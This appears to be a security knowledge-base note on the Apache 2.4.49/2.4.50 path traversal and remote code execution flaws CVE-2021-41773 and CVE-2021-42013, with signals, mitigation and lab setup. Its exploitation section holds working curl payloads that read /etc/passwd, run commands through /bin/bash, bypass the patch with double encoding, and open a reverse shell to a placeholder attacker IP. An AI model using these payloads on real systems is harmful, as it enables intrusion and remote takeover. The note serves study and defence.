---
tags:
  - vulnerability
  - cve
severity:
  - High
Vulnerability Category:
  - Remote Code Execution
  - Path Traversal
CVE: CVE-2021-41773/42013
CWE: CVE-22
OS: Linux
---
# Brief
Path Traversal and Remote Code Execution vulnerability in Apache HTTP Server 2.4.49 and 2.4.50. Allows attackers to read files outside the document root and, if CGI is enabled, achieve remote code execution (RCE) via specially crafted URLs.

---
# Overview
On October 5, 2021, CVE-2021-41773 was disclosed: a flaw in path normalization in Apache HTTP Server 2.4.49. Attackers can use path traversal to map URLs to files outside the document root. If files are not protected by `Require all denied`, these requests may succeed. Source code of interpreted files (CGI scripts) may also leak.

CVE-2021-42013 followed two days later, highlighting that the initial fix was incomplete. Attackers could still traverse outside the root via Alias-like directives. If CGI is enabled for these aliased paths, RCE is possible.

Affected versions:
- CVE-2021-41773: Apache 2.4.49
- CVE-2021-42013: Apache 2.4.49, 2.4.50

---
# Signals
- Apache version is 2.4.49 or 2.4.50 (`httpd -v`)
- Configuration allows access outside document root (absence of `Require all denied`)
- CGI module enabled (`LoadModule cgi_module modules/mod_cgi.so`)
- Aliased paths (e.g., `/cgi-bin`) present in config
- Can enumerate with:
    - [linpeas](Tools/linpeas) -> finds vulnerable Apache config
    - [curl](Tools/curl) -> test path traversal

---
# Exploitation

## Method

1. **File Disclosure (No CGI)**
    - Use curl with URL-encoded traversal:
      ```
      curl -v 'http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'
      ```
2. **Remote Code Execution (CGI enabled)**
    - POST request to bash:
      ```
      curl -v 'http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash' \
           -d 'echo Content-Type: text/plain; echo; cat /etc/passwd' \
           -H "Content-Type: text/plain"
      ```
3. **Double-encoding Bypass (2.4.50)**
    - Use double-encoded path:
      ```
      curl 'http://localhost:8080/cgi-bin/.%%32%65/.%%32%65/etc/passwd'
      ```
    - `%%32%65` decodes to `%2e`, allowing traversal.

4. **Reverse Shell (2.4.50)**
    - Inject a Reverse Shell Script, while listening on [netcat](Tools/netcat)
	```	
	curl -v 'http://localhost:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' -d 'echo; /bin/bash -c "bash -i >& /dev/tcp/<attack-ip>/<netcat-port? 0>&1"'
	```

## Under the Hood
- Flawed path normalization lets attackers traverse directories using encoded `..` segments in URL (`.%2e`)
- If access control is misconfigured, files outside the root are readable
- If CGI is enabled, attacker can execute code by POSTing to `/bin/bash` or similar
- In 2.4.50, double-encoding (`%%32%65`) bypasses incomplete patch

## Alternate Detection
- Manual config review for `Require all denied` on root and aliases
- Attempt exploit requests: file read or command execution
- Check for GET/POST requests to aliased paths (`/cgi-bin`) with traversal

---
# Pattern
- **Vulnerability Class:** Path Traversal (`CWE-22`)
- **Privilege Escalation Vector:** URL-encoded directory traversal
- **Trigger Mechanism:** Specially crafted URLs with encoded `..`
- **Exploit Mechanism:** Read arbitrary files (config, passwd); RCE if CGI enabled

## Related Techniques
- [Path Traversal](Techniques/Path Traversal)
- [URL Encoding Abuse](Techniques/URL Encoding Abuse)
- [Alias Directive Exploitation](Techniques/Alias Exploitation)
- [CGI Abuse](Techniques/CGI Abuse)

---
# Tools
- [curl](Tools/curl) -> Send crafted requests for traversal/RCE
- [docker](Tools/docker) -> Setup vulnerable Apache
- [linpeas](Tools/linpeas) -> Enumerate Apache config
- [exploit-db](Tools/exploitdb) -> Search for PoCs and modules

- Github-hosted PoCs:
    - [cve-2021-41773-poc](https://github.com/ambionics/apache-cve-2021-41773)
    - [cve-2021-42013-poc](https://github.com/kn0310/CVE-2021-42013)


---
# Mitigation

## Permanent Fix
- Upgrade Apache to 2.4.51 or later (`apt update && apt upgrade`)
    - Both CVEs are fully patched in 2.4.51+
- Ensure config contains:
    ```
    <Directory />
        Require all denied
    </Directory>
    ```
- Disable or restrict CGI if not required

## Temporary Workaround
- Explicitly deny access outside document root via configuration
- Remove or restrict alias directives as needed
- Disable CGI module

## Verify
- Attempt exploit requests; if denied or non-functional, system is patched
- Confirm Apache version is >= 2.4.51
- Check config for proper access controls

---
# References
- [Apache Security Advisory CVE-2021-41773](https://httpd.apache.org/security/vulnerabilities_24.html)
- [Apache Security Advisory CVE-2021-42013](https://httpd.apache.org/security/vulnerabilities_24.html)
- [Ambionics - CVE-2021-41773 Exploit](https://github.com/ambionics/apache-cve-2021-41773)
- [NVD: CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)
- [NVD: CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)
- [PayloadsAllTheThings â€“ Path Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

---
# Notes
- These exploits require non-default, insecure configurations (`Require all granted`)
- Double-encoding bypasses some filters in 2.4.50
- Enabling CGI increases risk to full RCE
- Most attacks target aliased paths like `/cgi-bin`
- Typical enumeration/discovery via tools like linpeas and manual curl attempts

---
# Setup Vuln Server
1. **Setup vulnerable Apache**
    - Docker image: `docker pull httpd:2.4.49`
    - Run: `docker run --name vuln-httpd -p 8080:80 -d httpd:2.4.49`
2. **Modify config to allow traversal**
    - Change:
      ```
      <Directory />
          AllowOverride none
          Require all granted
      </Directory>
      ```
    - Restart Apache
3. **Enable CGI for RCE**
    - Uncomment in config:
      ```
      LoadModule cgi_module modules/mod_cgi.so
      ```
    - Restart Apache

---
# Related CTFs